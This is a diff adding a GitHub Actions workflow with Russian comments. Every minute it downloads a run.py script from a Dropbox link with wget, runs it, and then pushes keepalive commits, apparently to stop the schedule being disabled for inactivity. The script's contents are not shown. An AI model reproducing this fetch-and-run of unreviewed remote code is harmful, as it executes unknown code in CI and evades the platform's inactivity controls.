@@ -1,0 +1,32 @@
+name: Auto Run Script
+
+on:
+  schedule:
+    - cron: "* * * * *"  # Запуск каждую минуту
+  workflow_dispatch:  # Возможность запуска вручную
+
+jobs:
+  run_script:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout репозитория
+        uses: actions/checkout@v4
+
+      - name: Установка requests
+        run: pip install requests
+
+      - name: Загрузка файла run.py
+        run: wget -O run.py "https://www.dropbox.com/scl/fi/2iv733izu8jbhfdg5wp6n/run.py?rlkey=vdriciwx3z3pusq0047ty25e6&st=f02t68nt&dl=1"
+
+      - name: Запуск run.py
+        run: python run.py
+
+      - name: Keep Repository Active
+        run: |
+          echo "Last run: $(date)" > keepalive.txt
+          git config --global user.name "GitHub Actions"
+          git config --global user.email "actions@github.com"
+          git add keepalive.txt
+          git commit -m "Keep repository active - $(date)" || echo "No changes to commit"
+          git push || echo "No changes to push"
